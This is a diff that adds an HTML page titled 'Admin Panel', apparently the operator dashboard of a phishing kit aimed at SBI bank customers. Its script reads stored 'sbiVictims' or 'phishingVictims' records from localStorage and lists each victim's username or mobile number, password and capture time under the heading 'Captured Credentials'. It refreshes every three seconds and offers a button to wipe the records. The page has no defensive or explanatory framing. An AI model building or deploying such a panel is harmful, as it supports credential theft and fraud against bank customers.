@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Panel</title>
+    <style>
+        body { background: #0b0e14; color: white; font-family: monospace; padding: 16px; }
+        h2 { color: #ff4d4d; }
+        .card { background: #1a1f2b; border-radius: 12px; padding: 16px; margin: 12px 0; border-left: 6px solid #ff4d4d; }
+        .label { color: #aaa; font-size: 13px; }
+        .value { font-size: 20px; font-weight: bold; word-break: break-all; margin: 5px 0; }
+        button { background: #ff4d4d; color: white; border: none; padding: 12px 20px; border-radius: 30px; font-size: 16px; margin: 5px; }
+        .empty { text-align: center; color: #666; padding: 40px; }
+    </style>
+</head>
+<body>
+    <h2>📊 Captured Credentials</h2>
+    <button onclick="loadData()">🔄 Refresh</button>
+    <button onclick="clearData()">🗑️ Clear</button>
+    <div id="dataContainer"></div>
+
+    <script>
+        function loadData() {
+            const data = localStorage.getItem('sbiVictims') || localStorage.getItem('phishingVictims');
+            const container = document.getElementById('dataContainer');
+            if (!data) {
+                container.innerHTML = '<div class="empty">No data captured yet.<br>Victim must login first.</div>';
+                return;
+            }
+            const victims = JSON.parse(data);
+            let html = '';
+            victims.slice().reverse().forEach(v => {
+                html += `<div class="card">
+                    <div class="label">👤 Username</div>
+                    <div class="value">${v.username || v.mobile || '—'}</div>
+                    <div class="label">🔐 Password</div>
+                    <div class="value">${v.password || '—'}</div>
+                    <div class="label">🕒 ${v.time || ''}</div>
+                </div>`;
+            });
+            container.innerHTML = html || '<div class="empty">No data.</div>';
+        }
+        function clearData() {
+            if (confirm('Delete all data?')) {
+                localStorage.removeItem('sbiVictims');
+                localStorage.removeItem('phishingVictims');
+                loadData();
+            }
+        }
+        loadData();
+        // Auto refresh every 3 seconds
+        setInterval(loadData, 3000);
+    </script>
+</body>
+</html>
